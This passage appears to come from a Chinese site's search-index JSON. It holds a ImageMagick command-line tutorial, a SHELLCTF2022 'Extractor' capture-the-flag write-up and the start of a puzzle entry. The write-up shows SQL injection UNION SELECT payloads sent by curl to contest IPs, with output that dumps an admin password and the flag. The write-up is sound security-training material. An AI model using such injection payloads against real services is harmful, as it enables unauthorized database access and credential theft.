backspace(\u56de\u5220\u952e):\u663e\u793a\u4e0a\u4e00\u5f20\u56fe\u7247 3. h: \u6c34\u5e73\u7ffb\u8f6c 4. v: \u5782\u76f4\u7ffb\u8f6c 5. /:\u987a\u65f6\u9488\u65cb\u8f6c90\u5ea6 6. \\:\u9006\u65f6\u9488\u65cb\u8f6c90\u5ea6 7. >: \u653e\u5927 8. <: \u7f29\u5c0f 9. F7:\u6a21\u7cca\u56fe\u7247 10. Alt+s:\u628a\u56fe\u7247\u4e2d\u95f4\u7684\u50cf\u7d20\u65cb\u8f6c 11. Ctrl+s:\u56fe\u8c61\u53e6\u5b58 12. Ctrl+d:\u5220\u9664\u56fe\u7247 13. q: \u9000\u51fa \u5176\u4ed6 ImageMagick\u8fd8\u63d0\u4f9b\u6709\u4e30\u5bcc\u7684\u7f16\u7a0b\u63a5\u53e3\uff0c\u6bd4\u5982\uff0c\u4f60\u53ef\u4ee5\u7528php\u6765\u8c03\u7528\u5b83\uff0c\u7528ImageMagick\u6765\u751f\u6210\u9a8c\u8bc1\u7801\u56fe\u7247\uff0c\u6548\u679c\u975e\u5e38\u68d2\u3002 ImageMagick\u8fd8\u6709\u4e00\u4e2a\u5c0f\u5de5\u5177identify\uff0c\u5b83\u53ef\u4ee5\u7528\u6765\u663e\u793a\u4e00\u4e2a\u56fe\u7247\u6587\u4ef6\u7684\u8be6\u6089\u4fe1\u606f\uff0c\u6bd4\u5982\u683c\u5f0f\u3001\u5206\u8fa8\u7387\u3001\u5927\u5c0f\u3001\u8272\u6df1\u7b49\u7b49\uff0c\u4f60\u90fd\u53ef\u7528\u5b83\u6765\u5e2e\u4f60\u7684\u5fd9\u3002 \u5982\u679c\u4f60\u5bf9\u547d\u4ee4\u884c\u4e0d\u592a\u719f\u6089\uff0c\u4f60\u4e5f\u53ef\u4ee5\u5728\u56fe\u7247\u4e0a\u5355\u51fb\uff0c\u4f60\u4f1a\u53d1\u73b0\uff0c\u901a\u8fc7\u9f20\u6807\u4f60\u4e5f\u53ef\u4ee5\u5b8c\u6210\u56fe\u50cf\u7684\u7f16\u8f91\u3002 ImageMagick\u7684\u7f51\u7ad9\uff1a www.imagemagick.org \u3002 \u8fd9\u91cc \u662fImageMagick\u52a0\u5de5\u8fc7\u7684\u56fe\u7247\u7684\u4f8b\u5b50\u3002 \u539f\u6587\u94fe\u63a5\uff1a http://www.charry.org/docs/linux/ImageMagick/ImageMagick.html","title":"\u6211\u7684ImageMagick\u4f7f\u7528\u5fc3\u5f97"},{"location":"Bash/%E6%88%91%E7%9A%84ImageMagick%E4%BD%BF%E7%94%A8%E5%BF%83%E5%BE%97/#imagemagick","text":"\u6587\uff1aCharry \u5728\u8ba4\u8bc6ImageMagick\u4e4b\u524d\uff0c\u6211\u4f7f\u7528\u7684\u56fe\u50cf\u6d4f\u89c8\u8f6f\u4ef6\u662fKuickShow\uff0c\u622a\u56fe\u8f6f\u4ef6\u662fKSnapShot\uff0c\u8fd9\u4e24\u6b3e\u8f6f\u4ef6\u90fd\u662fKDE\u9644\u5e26\u7684\u8f6f\u4ef6\uff0c\u7528\u8d77\u6765\u4e5f\u662f\u86ee\u65b9\u4fbf\u7684\u3002\u5728\u4e00\u6b21\u5076\u7136\u7684\u673a\u4f1a\u4e2d\uff0c\u6211\u9047\u5230\u4e86ImageMagick\uff0c\u624d\u53d1\u73b0Linux\u7adf\u7136\u6709\u5982\u6b64\u529f\u80fd\u5f3a\u5927\u7684\u56fe\u50cf\u8f6f\u4ef6\u3002 \u4f60\u5c06\u4f1a\u53d1\u73b0\uff0c\u5927\u90e8\u5206\u7684\u64cd\u4f5c\uff0c\u4f60\u53ea\u8981\u5728\u7ec8\u7aef\u4e0b\u52a8\u52a8\u952e\u76d8\u5373\u53ef\uff0c\u7701\u5f97\u4f60\u7528\u9f20\u6807\u70b9\u6765\u70b9\u53bb\u3002 \u4e0b\u9762\uff0c\u6211\u5bf9ImageMagick\u7684\u4e3b\u8981\u529f\u80fd\u505a\u4e00\u4e2a\u7b80\u5355\u7684\u4ecb\u7ecd\uff0c\u5176\u4e2d\u8986\u76d6\u7684\u5927\u90fd\u662f\u4eba\u4eec\u5e38\u7528\u7684\u4e00\u4e9b\u529f\u80fd\uff0c\u5982\u679c\u4f60\u8981\u5168\u9762\u7684\u4e86\u89e3\u5b83\u7684\u77e5\u8bc6\uff0c\u4f60\u53ef\u4ee5\u770b\u770b\u5b83\u7684man\u624b\u518c\u3002","title":"\u6211\u7684ImageMagick\u4f7f\u7528\u5fc3\u5f97"},{"location":"Bash/%E6%88%91%E7%9A%84ImageMagick%E4%BD%BF%E7%94%A8%E5%BF%83%E5%BE%97/#convert","text":"convert\u987e\u540d\u601d\u4e49\u5c31\u662f\u5bf9\u56fe\u50cf\u8fdb\u884c\u8f6c\u5316\uff0c\u5b83\u4e3b\u8981\u7528\u6765\u5bf9\u56fe\u50cf\u8fdb\u884c\u683c\u5f0f\u7684\u8f6c\u5316\uff0c\u540c\u65f6\u8fd8\u53ef\u4ee5\u505a\u7f29\u653e\u3001\u526a\u5207\u3001\u6a21\u7cca\u3001\u53cd\u8f6c\u7b49\u64cd\u4f5c\u3002","title":"convert"},{"location":"Bash/%E6%88%91%E7%9A%84ImageMagick%E4%BD%BF%E7%94%A8%E5%BF%83%E5%BE%97/#_1","text":"\u6bd4\u5982\u628a foo.jpg \u8f6c\u5316\u4e3a foo.png\uff1a convert foo.jpg foo.png \u5982\u679c\u8981\u60f3\u628a\u76ee\u5f55\u4e0b\u6240\u6709\u7684jpg\u6587\u4ef6\u90fd\u8f6c\u5316\u4e3agif\uff0c\u6211\u4eec\u53ef\u501f\u52a9\u4e8eshell\u7684\u5f3a\u5927\u529f\u80fd\uff1a find ./ -name \"*.jpg\" -exec convert {} {}.gif \\; \u8f6c\u5316\u540e\u7684gif\u540d\u79f0\u4e3a *.jpg.gif \uff0c\u8fd9\u6837\u770b\u8d77\u6765\u4e0d\u592a\u81ea\u7136\uff0c\u6ca1\u5173\u7cfb\uff0c\u6211\u4eec\u53ef\u4ee5\u518d\u6765\u4e00\u6b65\uff1a rename .jpg.gif .gif *.jpg.gif \u672c\u6765\uff0c\u6211\u60f3\u5728find\u7684\u65f6\u5019\uff0c\u7528basename\u6765\u53d6\u5f97\u4e0d\u5e26\u540e\u7f00\u7684\u6587\u4ef6\u540d\u7684\uff0c\u8fd9\u6837\u5c31\u4e0d\u4f1a\u5f62\u6210.jpg.gif\u8fd9\u79cd\u4e11\u964b\u7684\u540d\u5b50\u4e86\uff0c\u53ef\u662f\u4e0d\u77e5\u9053\u4e3a\u4ec0\u4e48\uff0c\u5c31\u662f\u4e0d\u884c\uff0c\u5982\u679c\u4f60\u77e5\u9053\u7684\u8bdd\uff0c\u544a\u8bc9\u6211 \u6216\u8005\uff0c\u4f60\u4e5f\u53ef\u7528shell script\u6765\u5b8c\u6210\u4e0a\u8ff0\u7684\u64cd\u4f5c\uff1a for i in *.jpg do convert $i `basename $i .jpg`.gif done \u6211\u4eec\u8fd8\u53ef\u7528mogrify\u6765\u5b8c\u6210\u540c\u6837\u7684\u6548\u679c\uff1a mogrify -format png *.jpg \u4e0a\u9762\u547d\u4ee4\u5c06\u4f1a\u628a\u76ee\u5f55\u4e0b\u9762\u6240\u6709\u7684jpg\u6587\u4ef6\u8f6c\u5316\u4e3apng\u683c\u5f0f\u3002 convert\u8fd8\u53ef\u4ee5\u628a\u591a\u5f20\u7167\u7247\u8f6c\u5316\u6210pdf\u683c\u5f0f\uff1a convert *.jpg foo.pdf","title":"\u683c\u5f0f\u8f6c\u5316"},{"location":"Bash/%E6%88%91%E7%9A%84ImageMagick%E4%BD%BF%E7%94%A8%E5%BF%83%E5%BE%97/#_2","text":"\u6bd4\u5982\u6211\u4eec\u8981\u4e3a\u4e00\u4e2a\u666e\u901a\u5927\u5c0f\u7684\u56fe\u7247\u505a\u4e00\u4e2a\u7f29\u7565\u56fe\uff0c\u6211\u4eec\u53ef\u4ee5\u8fd9\u6837 convert -resize 100x100 foo.jpg thumbnail.jpg \u4f60\u4e5f\u53ef\u4ee5\u7528\u767e\u5206\u6bd4\uff0c\u8fd9\u6837\u663e\u7684\u66f4\u4e3a\u76f4\u89c2\uff1a convert -resize 50%x50% foo.jpg thumbnail.jpg convert\u4f1a\u81ea\u52a8\u5730\u8003\u8651\u5728\u7f29\u653e\u56fe\u50cf\u5927\u5c0f\u65f6\u56fe\u50cf\u7684\u9ad8\u5bbd\u7684\u6bd4\u4f8b\uff0c\u4e5f\u5c31\u662f\u8bf4\u7740\u65b0\u7684\u56fe\u50cf\u7684\u9ad8\u5bbd\u6bd4\u4e0e\u539f\u56fe\u76f8\u540c\u3002 \u6211\u4eec\u8fd8\u53ef\u4ee5\u6279\u91cf\u751f\u6210\u7f29\u7565\u56fe\uff1a mogrify -sample 80x60 *.jpg \u6ce8\u610f\uff0c\u8fd9\u4e2a\u547d\u4ee4\u4f1a\u8986\u76d6\u539f\u6765\u7684\u56fe\u7247\uff0c\u4e0d\u8fc7\u4f60\u53ef\u4ee5\u5728\u64cd\u4f5c\u524d\uff0c\u5148\u628a\u4f60\u7684\u56fe\u7247\u5907\u4efd\u4e00\u4e0b\u3002","title":"\u5927\u5c0f\u7f29\u653e"},{"location":"Bash/%E6%88%91%E7%9A%84ImageMagick%E4%BD%BF%E7%94%A8%E5%BF%83%E5%BE%97/#_3","text":"\u5728\u4e00\u5f20\u7167\u7247\u7684\u56db\u5468\u52a0\u4e0a\u8fb9\u6846\uff0c\u53ef\u4ee5\u7528 -mattecolor \u53c2\u6570\uff0c\u6bd4\u5982\u67d0\u4f4d\u540c\u5fd7\u727a\u7272\u4e86\uff0c\u6211\u4eec\u9700\u8981\u4e3a\u4ed6\u505a\u4e00\u5f20\u9ed1\u8fb9\u6846\u7684\u9057\u50cf\uff0c\u53ef\u4ee5\u8fd9\u6837\uff1a convert -mattecolor \"#000000\" -frame 60x60 yourname.jpg rememberyou.png \u5176\u4e2d\uff0c\"#000000\"\u662f\u8fb9\u6846\u7684\u989c\u8272\uff0c\u8fb9\u6846\u7684\u5927\u5c0f\u4e3a60x60 \u4f60\u4e5f\u53ef\u4ee5\u8fd9\u6837\u52a0\u8fb9\u6846: convert -border 60x60 -bordercolor \"#000000\" yourname.jpg rememberyou.png","title":"\u52a0\u8fb9\u6846"},{"location":"Bash/%E6%88%91%E7%9A%84ImageMagick%E4%BD%BF%E7%94%A8%E5%BF%83%E5%BE%97/#_4","text":"convert -fill green -pointsize 40 -draw 'text 10,50 \"charry.org\"' foo.png bar.png \u4e0a\u9762\u7684\u547d\u4ee4\u5728\u8ddd\u79bb\u56fe\u7247\u7684\u5de6\u4e0a\u89d210x50\u7684\u4f4d\u7f6e\uff0c\u7528\u7eff\u8272\u7684\u5b57\u5199\u4e0bcharry.org\uff0c\u5982\u679c\u4f60\u8981\u6307\u5b9a\u522b\u7684\u5b57\u4f53\uff0c\u53ef\u4ee5\u7528-font\u53c2\u6570\u3002","title":"\u5728\u56fe\u7247\u4e0a\u52a0\u6587\u5b57"},{"location":"Bash/%E6%88%91%E7%9A%84ImageMagick%E4%BD%BF%E7%94%A8%E5%BF%83%E5%BE%97/#_5","text":"\u9ad8\u65af\u6a21\u7cca: convert -blur 80 foo.jpg foo.png -blur\u53c2\u6570\u8fd8\u53ef\u4ee5\u8fd9\u6837-blur 80x5\u3002\u540e\u9762\u7684\u90a3\u4e2a5\u8868\u793a\u7684\u662fSigma\u7684\u503c\uff0c\u8fd9\u4e2a\u662f\u56fe\u50cf\u672f\u8bed\uff0c\u6211\u4e5f\u4e0d\u592a\u6e05\u695a\uff0c\u603b\u4e4b\uff0c\u5b83\u7684\u503c\u5bf9\u6a21\u7cca\u7684\u6548\u679c\u8d77\u5173\u952e\u7684\u4f5c\u7528\u3002","title":"\u6a21\u7cca"},{"location":"Bash/%E6%88%91%E7%9A%84ImageMagick%E4%BD%BF%E7%94%A8%E5%BF%83%E5%BE%97/#_6","text":"\u4e0a\u4e0b\u7ffb\u8f6c\uff1a convert -flip foo.png bar.png \u5de6\u53f3\u7ffb\u8f6c\uff1a convert -flop foo.png bar.png","title":"\u7ffb\u8f6c"},{"location":"Bash/%E6%88%91%E7%9A%84ImageMagick%E4%BD%BF%E7%94%A8%E5%BF%83%E5%BE%97/#_7","text":"\u5f62\u6210\u5e95\u7247\u7684\u6837\u5b50\uff1a convert -negate foo.png bar.png","title":"\u53cd\u8272"},{"location":"Bash/%E6%88%91%E7%9A%84ImageMagick%E4%BD%BF%E7%94%A8%E5%BF%83%E5%BE%97/#_8","text":"\u628a\u56fe\u7247\u53d8\u4e3a\u9ed1\u767d\u989c\u8272\uff1a convert -monochrome foo.png bar.png","title":"\u5355\u8272"},{"location":"Bash/%E6%88%91%E7%9A%84ImageMagick%E4%BD%BF%E7%94%A8%E5%BF%83%E5%BE%97/#_9","text":"convert -noise 3 foo.png bar.png","title":"\u52a0\u566a\u58f0"},{"location":"Bash/%E6%88%91%E7%9A%84ImageMagick%E4%BD%BF%E7%94%A8%E5%BF%83%E5%BE%97/#_10","text":"\u6211\u4eec\u53ef\u7528\u8fd9\u4e2a\u529f\u80fd\uff0c\u628a\u4e00\u5f20\u666e\u901a\u7684\u56fe\u7247\uff0c\u53d8\u6210\u4e00\u5f20\u6cb9\u753b\uff0c\u6548\u679c\u975e\u5e38\u7684\u903c\u771f convert -paint 4 foo.png bar.png","title":"\u6cb9\u753b\u6548\u679c"},{"location":"Bash/%E6%88%91%E7%9A%84ImageMagick%E4%BD%BF%E7%94%A8%E5%BF%83%E5%BE%97/#_11","text":"\u628a\u4e00\u5f20\u56fe\u7247\uff0c\u65cb\u8f6c\u4e00\u5b9a\u7684\u89d2\u5ea6\uff1a convert -rotate 30 foo.png bar.png \u4e0a\u9762\u768430\uff0c\u8868\u793a\u5411\u53f3\u65cb\u8f6c30\u5ea6\uff0c\u5982\u679c\u8981\u5411\u5de6\u65cb\u8f6c\uff0c\u5ea6\u6570\u5c31\u662f\u8d1f\u6570\u3002","title":"\u65cb\u8f6c"},{"location":"Bash/%E6%88%91%E7%9A%84ImageMagick%E4%BD%BF%E7%94%A8%E5%BF%83%E5%BE%97/#_12","text":"convert -charcoal 2 foo.png bar.png \u5f62\u6210\u70ad\u7b14\u6216\u8005\u8bf4\u662f\u94c5\u7b14\u753b\u7684\u6548\u679c\u3002","title":"\u70ad\u7b14\u6548\u679c"},{"location":"Bash/%E6%88%91%E7%9A%84ImageMagick%E4%BD%BF%E7%94%A8%E5%BF%83%E5%BE%97/#_13","text":"\u6bdb\u73bb\u7483\u6548\u679c\uff1a convert -spread 30 foo.png bar.png","title":"\u6563\u5c04"},{"location":"Bash/%E6%88%91%E7%9A%84ImageMagick%E4%BD%BF%E7%94%A8%E5%BF%83%E5%BE%97/#_14","text":"\u4ee5\u56fe\u7247\u7684\u4e2d\u5fc3\u4f5c\u4e3a\u53c2\u7167\uff0c\u628a\u56fe\u7247\u626d\u8f6c\uff0c\u5f62\u6210\u6f29\u6da1\u7684\u6548\u679c\uff1a convert -swirl 67 foo.png bar.png","title":"\u6f29\u6da1"},{"location":"Bash/%E6%88%91%E7%9A%84ImageMagick%E4%BD%BF%E7%94%A8%E5%BF%83%E5%BE%97/#_15","text":"\u7528-raise\u6765\u521b\u5efa\u51f8\u8fb9\uff1a convert -raise 5x5 foo.png bar.png \u6267\u884c\u540e\uff0c\u4f60\u4f1a\u770b\u5230\uff0c\u7167\u7247\u7684\u56db\u5468\u4f1a\u4e00\u4e2a5x5\u7684\u8fb9\uff0c\u5982\u679c\u4f60\u8981\u4e00\u4e2a\u51f9\u4e0b\u53bb\u7684\u8fb9\uff0c\u628a-raise\u6539\u4e3a+raise\u5c31\u53ef\u4ee5\u4e86\u3002\u5176\u5b9e\u51f8\u8fb9\u548c\u51f9\u8fb9\u770b\u8d77\u6765\u533a\u522b\u5e76\u4e0d\u662f\u5f88\u5927\u3002","title":"\u51f8\u8d77\u6548\u679c"},{"location":"Bash/%E6%88%91%E7%9A%84ImageMagick%E4%BD%BF%E7%94%A8%E5%BF%83%E5%BE%97/#_16","text":"\u5176\u4ed6\u529f\u80fd\u90fd\u662f\u4e0d\u592a\u5e38\u7528\u7684\uff0c\u5982\u679c\u4f60\u611f\u5174\u8da3\u7684\u8bdd\uff0c\u53ef\u4ee5\u770b\u5b83\u7684\u8054\u673a\u6587\u6863","title":"\u5176\u4ed6"},{"location":"Bash/%E6%88%91%E7%9A%84ImageMagick%E4%BD%BF%E7%94%A8%E5%BF%83%E5%BE%97/#import","text":"import\u662f\u4e00\u4e2a\u7528\u4e8e\u5c4f\u5e55\u622a\u56fe\u7684\u7ec4\u4ef6\uff0c\u4e0b\u9762\u5217\u51fa\u7684\u662f\u6211\u4eec\u5e38\u7528\u7684\u529f\u80fd\uff0c\u5176\u4ed6\u7684\u529f\u80fd\uff0c\u4f60\u53c2\u8003\u5b83\u7684man\u597d\u4e86\u3002","title":"import"},{"location":"Bash/%E6%88%91%E7%9A%84ImageMagick%E4%BD%BF%E7%94%A8%E5%BF%83%E5%BE%97/#_17","text":"import foo.png \u5728\u8f93\u5165\u4e0a\u8ff0\u7684\u547d\u4ee4\u540e\uff0c\u4f60\u7684\u9f20\u6807\u4f1a\u53d8\u6210\u4e00\u4e2a\u5341\u5b57\uff0c\u8fd9\u4e2a\u65f6\u5019\uff0c\u4f60\u53ea\u8981\u5728\u60f3\u8981\u622a\u53d6\u7684\u5730\u65b9\u5212\u4e00\u4e2a\u77e9\u5f62\u5c31\u53ef\u4ee5\u4e86","title":"\u622a\u53d6\u5c4f\u5e55\u7684\u4efb\u4e00\u77e9\u5f62\u533a\u57df"},{"location":"Bash/%E6%88%91%E7%9A%84ImageMagick%E4%BD%BF%E7%94%A8%E5%BF%83%E5%BE%97/#_18","text":"import -pause 3 -frame foo.png \u56de\u8f66\u540e\uff0c\u7528\u9f20\u6807\u5728\u4f60\u60f3\u622a\u7684\u7a97\u53e3\u4e0a\u70b9\u4e00\u4e0b\u5373\u53ef\u3002\u53c2\u6570-frame\u7684\u4f5c\u7528\u662f\u544a\u8bc9import\uff0c\u622a\u56fe\u7684\u65f6\u5019\u628a\u76ee\u6807\u7a97\u53e3\u7684\u5916\u6846\u67b6\u5e26\u4e0a\uff0c\u53c2\u6570-pause\u7684\u4f5c\u7528\u5f88\u91cd\u8981\uff0c\u4f60\u53ef\u4ee5\u8bd5\u7740\u628a\u5b83\u53bb\u6389\uff0c\u5bf9\u6bd4\u4e00\u4e0b\uff0c\u4f60\u4f1a\u53d1\u73b0\uff0c\u76ee\u6807\u7a97\u53e3\u7684\u6807\u9898\u680f\u662f\u7070\u8272\u7684\uff0cpause\u5c31\u662f\u8ba9import\u7a0d\u5fae\u5ef6\u8fdf\u4e00\u4e0b\uff0c\u7b49\u4f60\u7684\u76ee\u6807\u7a97\u53e3\u83b7\u5f97\u7126\u70b9\u4e86\uff0c\u624d\u5f00\u59cb\u622a\u56fe\uff0c\u8fd9\u6837\u7684\u56fe\u624d\u6bd4\u8f83\u81ea\u7136\u3002","title":"\u622a\u53d6\u7a0b\u5e8f\u7684\u7a97\u53e3"},{"location":"Bash/%E6%88%91%E7%9A%84ImageMagick%E4%BD%BF%E7%94%A8%E5%BF%83%E5%BE%97/#_19","text":"\u5982\u679c\u60f3\u8ba9\u4f60\u7684\u622a\u56fe\u6bd4\u8f83cool\uff0c\u4f60\u53ef\u4ee5\u628a\u622a\u53d6\u4e00\u4e2a\u503e\u659c\u7684\u7a97\u53e3\uff0c\u65b9\u6cd5\u5982\u4e0b\uff1a import -rotate 30 -pause 3 -frame foo.png","title":"\u622a\u53d6\u4e00\u4e2a\u503e\u659c\u7684\u7a97\u53e3"},{"location":"Bash/%E6%88%91%E7%9A%84ImageMagick%E4%BD%BF%E7%94%A8%E5%BF%83%E5%BE%97/#_20","text":"import -pause 3 -window root screen.png \u6ce8\u610f\uff0c\u6682\u505c\u4e863\u79d2\u949f\uff0c\u4f60\u9700\u8981\u57283\u79d2\u949f\u5185\u5207\u6362\u5230\u9700\u8981\u622a\u53d6\u7684\u753b\u9762\u5662\u3002","title":"\u622a\u53d6\u6574\u4e2a\u5c4f\u5e55"},{"location":"Bash/%E6%88%91%E7%9A%84ImageMagick%E4%BD%BF%E7%94%A8%E5%BF%83%E5%BE%97/#display","text":"display\u5e94\u8be5\u662f\u6211\u4eec\u4f7f\u7528\u7684\u6700\u4e3a\u9891\u7e41\u7684\u56fe\u50cf\u5904\u7406\u8f6f\u4ef6\u4e86\uff0c\u6bd5\u7adf\uff0c\u8fd8\u662f\u770b\u7684\u591a","title":"display"},{"location":"Bash/%E6%88%91%E7%9A%84ImageMagick%E4%BD%BF%E7%94%A8%E5%BF%83%E5%BE%97/#_21","text":"display foo.png \u5982\u679c\u4f60\u8981\u663e\u793a\u591a\u4e2a\u6587\u4ef6\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528\u901a\u914d\u7b26 display *.png","title":"\u663e\u793a\u56fe\u7247"},{"location":"Bash/%E6%88%91%E7%9A%84ImageMagick%E4%BD%BF%E7%94%A8%E5%BF%83%E5%BE%97/#_22","text":"display -delay 5 * \u6bcf\u96945\u4e2a\u767e\u5206\u4e4b\u79d2\u663e\u793a\u4e00\u5f20\u56fe\u7247 \u4e00\u4e9b\u5feb\u6377\u952e 1. space(\u7a7a\u683c): \u663e\u793a\u4e0b\u4e00\u5f20\u56fe\u7247 2. backspace(\u56de\u5220\u952e):\u663e\u793a\u4e0a\u4e00\u5f20\u56fe\u7247 3. h: \u6c34\u5e73\u7ffb\u8f6c 4. v: \u5782\u76f4\u7ffb\u8f6c 5. /:\u987a\u65f6\u9488\u65cb\u8f6c90\u5ea6 6. \\:\u9006\u65f6\u9488\u65cb\u8f6c90\u5ea6 7. >: \u653e\u5927 8. <: \u7f29\u5c0f 9. F7:\u6a21\u7cca\u56fe\u7247 10. Alt+s:\u628a\u56fe\u7247\u4e2d\u95f4\u7684\u50cf\u7d20\u65cb\u8f6c 11. Ctrl+s:\u56fe\u8c61\u53e6\u5b58 12. Ctrl+d:\u5220\u9664\u56fe\u7247 13. q: \u9000\u51fa","title":"\u5e7b\u706f\u7247"},{"location":"Bash/%E6%88%91%E7%9A%84ImageMagick%E4%BD%BF%E7%94%A8%E5%BF%83%E5%BE%97/#_23","text":"ImageMagick\u8fd8\u63d0\u4f9b\u6709\u4e30\u5bcc\u7684\u7f16\u7a0b\u63a5\u53e3\uff0c\u6bd4\u5982\uff0c\u4f60\u53ef\u4ee5\u7528php\u6765\u8c03\u7528\u5b83\uff0c\u7528ImageMagick\u6765\u751f\u6210\u9a8c\u8bc1\u7801\u56fe\u7247\uff0c\u6548\u679c\u975e\u5e38\u68d2\u3002 ImageMagick\u8fd8\u6709\u4e00\u4e2a\u5c0f\u5de5\u5177identify\uff0c\u5b83\u53ef\u4ee5\u7528\u6765\u663e\u793a\u4e00\u4e2a\u56fe\u7247\u6587\u4ef6\u7684\u8be6\u6089\u4fe1\u606f\uff0c\u6bd4\u5982\u683c\u5f0f\u3001\u5206\u8fa8\u7387\u3001\u5927\u5c0f\u3001\u8272\u6df1\u7b49\u7b49\uff0c\u4f60\u90fd\u53ef\u7528\u5b83\u6765\u5e2e\u4f60\u7684\u5fd9\u3002 \u5982\u679c\u4f60\u5bf9\u547d\u4ee4\u884c\u4e0d\u592a\u719f\u6089\uff0c\u4f60\u4e5f\u53ef\u4ee5\u5728\u56fe\u7247\u4e0a\u5355\u51fb\uff0c\u4f60\u4f1a\u53d1\u73b0\uff0c\u901a\u8fc7\u9f20\u6807\u4f60\u4e5f\u53ef\u4ee5\u5b8c\u6210\u56fe\u50cf\u7684\u7f16\u8f91\u3002 ImageMagick\u7684\u7f51\u7ad9\uff1a www.imagemagick.org \u3002 \u8fd9\u91cc \u662fImageMagick\u52a0\u5de5\u8fc7\u7684\u56fe\u7247\u7684\u4f8b\u5b50\u3002 \u539f\u6587\u94fe\u63a5\uff1a http://www.charry.org/docs/linux/ImageMagick/ImageMagick.html","title":"\u5176\u4ed6"},{"location":"CTF/SHELLCTF2022_Extractor/","text":"Extractor 1 Problem \u63d0\u793a\uff1a - Flag format :- shellctf{H3re_1s_tH3_fL4G} - http://20.125.142.38:8956 - Alternate URL :- http://20.193.247.209:8555/ -\u3000More Alternate URL :- http://52.66.29.74:8999/ \u4e24\u4e2a\u94fe\u63a5\uff1a\u6ce8\u518c\uff0c\u767b\u5f55 curl 'http://20.125.142.38:8956/register?username=hu&pass=hu&content=hu' curl 'http://20.125.142.38:8956/login' # \u7eafHTML\u9875\u9762\uff0c\u70b9Login\u8df3\u8f6cprofile curl 'http://20.125.142.38:8956/profile?username=hu&pass=hu&content=' 2 exp profile\u5728Password\u5904\u5b58\u5728\u6ce8\u5165\uff1a 0' union select 1,2,3,4-- , \u6570\u636e\u5e93\u7c7b\u578b\u4e3asqlite hamilton@hamilton-Lenovo-G470:~/Downloads$ curl \"http://52.66.29.74:8999/profile?username=hu&pass=0%27+union+select+1,2,3,4--&content=\" | grep h3 % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 3637 100 3637 0 0 12761 0 --:--:-- --:--:-- --:--:-- 12806 <p> <h3> Here is what you left with us : </h3></p> <h3> Name : 2 </h3> <h3> Password : 3 </h3> <h3> Signature : 4 </h3> hamilton@hamilton-Lenovo-G470:~/Downloads$ curl \"http://52.66.29.74:8999/profile?username=hu&pass=0%27+union+select+1,2,3,name+from+sqlite_master--&content=\" | grep h3 % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 3642 100 3642 0 0 12472 0 --:--:-- --:--:-- --:--:-- 12472 <p> <h3> Here is what you left with us : </h3></p> <h3> Name : 2 </h3> <h3> Password : 3 </h3> <h3> Signature : Admins</h3> curl \"http://52.66.29.74:8999/profile?username=hu&pass=0%27+union+select+*+from+Admins--&content=\" | grep h3 % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 3686 100 3686 0 0 7431 0 --:--:-- --:--:-- --:--:-- 7416 <p> <h3> Here is what you left with us : </h3></p> <h3> Name : Adminnn </h3> <h3> Password : H4rD_t0_Gue5s</h3> <h3> Signature : shellctf { Sql_1Nj3c7i0n_B45iC_XD } </h3> \u539f\u9898\u89c1 https://github.com/S-H-E-L-L/S.H.E.L.L-CTF-2022/tree/main/web/Extractor","title":"Extractor"},{"location":"CTF/SHELLCTF2022_Extractor/#extractor","text":"","title":"Extractor"},{"location":"CTF/SHELLCTF2022_Extractor/#1-problem","text":"\u63d0\u793a\uff1a - Flag format :- shellctf{H3re_1s_tH3_fL4G} - http://20.125.142.38:8956 - Alternate URL :- http://20.193.247.209:8555/ -\u3000More Alternate URL :- http://52.66.29.74:8999/ \u4e24\u4e2a\u94fe\u63a5\uff1a\u6ce8\u518c\uff0c\u767b\u5f55 curl 'http://20.125.142.38:8956/register?username=hu&pass=hu&content=hu' curl 'http://20.125.142.38:8956/login' # \u7eafHTML\u9875\u9762\uff0c\u70b9Login\u8df3\u8f6cprofile curl 'http://20.125.142.38:8956/profile?username=hu&pass=hu&content='","title":"1 Problem"},{"location":"CTF/SHELLCTF2022_Extractor/#2-exp","text":"profile\u5728Password\u5904\u5b58\u5728\u6ce8\u5165\uff1a 0' union select 1,2,3,4-- , \u6570\u636e\u5e93\u7c7b\u578b\u4e3asqlite hamilton@hamilton-Lenovo-G470:~/Downloads$ curl \"http://52.66.29.74:8999/profile?username=hu&pass=0%27+union+select+1,2,3,4--&content=\" | grep h3 % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 3637 100 3637 0 0 12761 0 --:--:-- --:--:-- --:--:-- 12806 <p> <h3> Here is what you left with us : </h3></p> <h3> Name : 2 </h3> <h3> Password : 3 </h3> <h3> Signature : 4 </h3> hamilton@hamilton-Lenovo-G470:~/Downloads$ curl \"http://52.66.29.74:8999/profile?username=hu&pass=0%27+union+select+1,2,3,name+from+sqlite_master--&content=\" | grep h3 % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 3642 100 3642 0 0 12472 0 --:--:-- --:--:-- --:--:-- 12472 <p> <h3> Here is what you left with us : </h3></p> <h3> Name : 2 </h3> <h3> Password : 3 </h3> <h3> Signature : Admins</h3> curl \"http://52.66.29.74:8999/profile?username=hu&pass=0%27+union+select+*+from+Admins--&content=\" | grep h3 % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 3686 100 3686 0 0 7431 0 --:--:-- --:--:-- --:--:-- 7416 <p> <h3> Here is what you left with us : </h3></p> <h3> Name : Adminnn </h3> <h3> Password : H4rD_t0_Gue5s</h3> <h3> Signature : shellctf { Sql_1Nj3c7i0n_B45iC_XD } </h3> \u539f\u9898\u89c1 https://github.com/S-H-E-L-L/S.H.E.L.L-CTF-2022/tree/main/web/Extractor","title":"2 exp"},{"location":"CTF/SHELLCTF2022_World%27s_greatest_detective/","text":"1 \u9898\u76ee \u5907\u4efd\uff1a https://img.vjob.top/imgs/Wakandan_Translator.png 2 \u89e3\u9898 https://new.qq.com/rain/a/20200702A0NQ2O00?pc flag: SHELLCTF{W?kandC_F?rev?r} \uff13\u3000\u74e6\u5e72\u8fbe\u6587\u5b57/\u74e6\u5e72\u9054\u6587\u5b57 BAK: https://img.vjob.top/imgs/Wakandan.jpg \uff14\u3000 SHELLCTF{W4kandA_F0rev3r}","title":"SHELLCTF2022 World's greatest detective"},{"location":"CTF/SHELLCTF2022_World%27s_greatest_detective/#1","text":"\u5907\u4efd\uff1a https://img.vjob.top/imgs/Wakandan_Translator.png","title":"1 